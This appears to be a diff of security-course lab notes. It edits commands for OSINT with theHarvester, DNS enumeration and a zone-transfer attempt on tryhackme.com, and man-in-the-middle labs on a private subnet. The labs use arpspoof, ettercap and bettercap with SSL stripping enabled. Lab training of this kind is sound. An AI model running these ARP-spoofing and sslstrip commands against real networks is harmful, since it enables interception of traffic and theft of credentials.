@@ -45,25 +45,26 @@ sudo apt update
 sudo apt install -y theharvester
 
 A more complete OSINT sequence:
-theHarvester -d tryhackme.com -b bing
-theHarvester -d tryhackme.com -b google
-theHarvester -d tryhackme.com -b duckduckgo
+theHarvester -d tryhackme.com -b duckduckgo,crtsh,rapiddns,urlscan
 
 
 
 LAB 3
-nslookup tryhackme.com
-nslookup -type=mx tryhackme.com
-nslookup -type=ns tryhackme.com
-nslookup -type=txt tryhackme.com
-dig tryhackme.com
-dig mx tryhackme.com
-dig ns tryhackme.com
-dig txt tryhackme.com
+sudo apt update
+sudo apt install -y dnsutils
+nslookup tryhackme.com 8.8.8.8
+nslookup -type=mx tryhackme.com 8.8.8.8
+nslookup -type=ns tryhackme.com 8.8.8.8
+nslookup -type=txt tryhackme.com 8.8.8.8
+dig tryhackme.com @8.8.8.8
+dig mx tryhackme.com @8.8.8.8
+dig ns tryhackme.com @8.8.8.8
+dig txt tryhackme.com @8.8.8.8
 host tryhackme.com
 host -t mx tryhackme.com
 host -t ns tryhackme.com
 dig @ns1.tryhackme.com tryhackme.com AXFR
+
 
 
 
@@ -77,16 +78,16 @@ sudo docker run --name dvwa -p 80:80 vulnerables/web-dvwa
 sudo ettercap -G
 
 
-
+***** for lab 5,6 use diff ip add 1st is victim and second is gateway *****
 LAB 5
 sudo apt update
 sudo apt install -y dsniff ettercap-graphical tcpdump
 sudo sysctl -w net.ipv4.ip_forward=1
 ip a
 ip route
-sudo arpspoof -i eth0 -t 192.168.234.130 192.168.234.2
+sudo arpspoof -i eth0 -t 192.168.234.1 192.168.234.2
 # Terminal 2:
-sudo arpspoof -i eth0 -t 192.168.234.2 192.168.234.130
+sudo arpspoof -i eth0 -t 192.168.234.2 192.168.234.1
 # Terminal 3:
 sudo tcpdump -i eth0 -n -v
 sudo ettercap -T -M arp:remote /192.168.234.130// /192.168.234.2//
@@ -98,12 +99,11 @@ sudo apt update
 sudo apt install -y bettercap apache2 wireshark
 sudo service apache2 start
 sudo sysctl -w net.ipv4.ip_forward=1
-sudo bettercap -iface eth0
+sudo bettercap -iface eth0 --gateway-override 192.168.234.2
 
-Inside Bettercap shell:
 net.probe on
 net.show
-set arp.spoof.targets 192.168.234.130
+set arp.spoof.targets 192.168.234.1
 set arp.spoof.fullduplex true
 arp.spoof on
 set http.proxy.sslstrip true
